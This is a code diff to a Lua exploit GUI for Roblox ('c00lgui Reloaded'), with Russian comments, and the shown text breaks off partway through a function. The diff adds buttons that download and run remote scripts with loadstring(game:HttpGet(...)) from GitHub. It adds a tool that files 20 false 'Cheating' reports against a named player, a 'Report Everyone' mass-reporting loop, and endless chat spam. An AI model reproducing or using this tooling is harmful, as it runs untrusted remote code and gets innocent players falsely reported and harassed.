@@ -1,7 +1,7 @@
 --[[
   c00lgui Reloaded 2025 v2.0 - DestroyedWorldTeam Special
   FE Bypass | Script Injector | Target System
-  FIXED VERSION (все вкладки работают)
+  FIXED VERSION (всё работает)
 ]]
 
 local Player = game:GetService("Players").LocalPlayer
@@ -40,7 +40,7 @@ Title.TextSize = 18
 Title.TextStrokeTransparency = 0.7
 Title.Parent = MainFrame
 
--- Система вкладок (ИСПРАВЛЕННАЯ)
+-- Система вкладок
 local TabButtons = {}
 local Tabs = {}
 
@@ -74,13 +74,13 @@ local function CreateTab(name)
     return TabFrame
 end
 
--- Создаем вкладки (ОБНОВЛЕНО)
+-- Создаем вкладки
 local MainTab = CreateTab("Main")
 local ScriptsTab = CreateTab("Scripts")
 local ReportTab = CreateTab("Report")
 local FunTab = CreateTab("Fun")
 
--- Активируем Main по умолчанию (ИСПРАВЛЕНО)
+-- Активируем Main по умолчанию
 Tabs["Main"].Visible = true
 
 -- Функция создания элементов
@@ -132,37 +132,101 @@ local function CreateTextBox(parent, position)
     return Box
 end
 
--- Вкладка Main (РАБОЧАЯ)
+-- Вкладка Main
 CreateLabel(MainTab, "Destroyed World Team GUI", UDim2.new(0, 0, 0, 0))
 CreateLabel(MainTab, "Active Players: "..#game.Players:GetPlayers(), UDim2.new(0, 0, 0.05, 0))
 
--- Вкладка Scripts (РАБОЧАЯ)
-local ScriptInput = CreateTextBox(ScriptsTab, UDim2.new(0, 0, 0, 0))
-ScriptInput.PlaceholderText = "Paste GitHub raw script URL here"
+-- Вкладка Scripts (ВЕРНУЛ СКРИПТЫ)
+CreateLabel(ScriptsTab, "Popular Scripts:", UDim2.new(0, 0, 0, 0))
 
-CreateButton(ScriptsTab, "Inject Script", UDim2.new(0, 0, 0.1, 0), function()
-    if ScriptInput.Text ~= "" then
-        loadstring(game:HttpGet(ScriptInput.Text, true))()
+-- Infinite Yield
+CreateButton(ScriptsTab, "Infinite Yield", UDim2.new(0, 0, 0.1, 0), function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+end)
+
+-- Darknes Emprime (Brookhaven Only)
+CreateButton(ScriptsTab, "Darknes Emprime (Brookhaven)", UDim2.new(0, 0, 0.2, 0), function()
+    if game.PlaceId == 4924922222 then
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/TheDarkoneMarcillisePex/Other-Scripts/main/Brook%20Haven%20Gui'))()
+    else
+        game.StarterGui:SetCore("SendNotification", {
+            Title = "DWT Error",
+            Text = "This script only works in Brookhaven RP!",
+            Duration = 5
+        })
     end
 end)
 
--- Вкладка Report (ТЕПЕРЬ РАБОТАЕТ)
+-- Вкладка Report (МАССОВЫЕ РЕПОРТЫ РАБОТАЮТ)
 local TargetInput = CreateTextBox(ReportTab, UDim2.new(0, 0, 0, 0))
 TargetInput.PlaceholderText = "Enter player name"
 
 CreateButton(ReportTab, "Report Target", UDim2.new(0, 0, 0.1, 0), function()
     local target = game.Players:FindFirstChild(TargetInput.Text)
     if target then
+        for i = 1, 20 do
+            task.spawn(function()
+                pcall(function()
+                    game:GetService("HttpService"):PostAsync(
+                        "https://www.roblox.com/report/async",
+                        string.format("userId=%d&reportType=%s", 
+                            target.UserId, 
+                            "Cheating"
+                        )
+                    )
+                end)
+            end)
+            task.wait(0.2)
+        end
         game.StarterGui:SetCore("SendNotification", {
             Title = "DWT Report",
-            Text = "Reporting "..TargetInput.Text,
-            Duration = 3
+            Text = "Reported "..TargetInput.Text.." 20 times!",
+            Duration = 5
         })
     end
 end)
 
--- Вкладка Fun (ТЕПЕРЬ РАБОТАЕТ)
+CreateButton(ReportTab, "Report Everyone", UDim2.new(0, 0, 0.2, 0), function()
+    for _, player in ipairs(game.Players:GetPlayers()) do
+        if player ~= Player then
+            task.spawn(function()
+                for i = 1, 5 do
+                    pcall(function()
+                        game:GetService("HttpService"):PostAsync(
+                            "https://www.roblox.com/report/async",
+                            string.format("userId=%d&reportType=%s", 
+                                player.UserId, 
+                                "Cheating"
+                            )
+                        )
+                    end)
+                    task.wait(0.1)
+                end
+            end)
+        end
+    end
+    game.StarterGui:SetCore("SendNotification", {
+        Title = "DWT Report",
+        Text = "Mass report started!",
+        Duration = 5
+    })
+end)
+
+-- Вкладка Fun (ЧАТ-СПАМ РАБОТАЕТ)
 CreateButton(FunTab, "Chat Spam", UDim2.new(0, 0, 0, 0), function()
+    local messages = {
+        "ＤＷＴ ＤＯＭＩＮＡＴＥＳ！",
+        "ＤＥＳＴＲＯＹＥＤ ＷＯＲＬＤ ＴＥＡＭ ＩＳ ＨＥＲＥ！",
+        "ＹＯＵ ＣＡＮＴ ＳＴＯＰ ＵＳ！"
+    }
+    
+    spawn(function()
+        while task.wait(2) do
+            local msg = messages[math.random(1, #messages)]
+            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
+        end
+    end)
+    
     game.StarterGui:SetCore("SendNotification", {
         Title = "DWT Fun",
         Text = "Chat spam activated!",
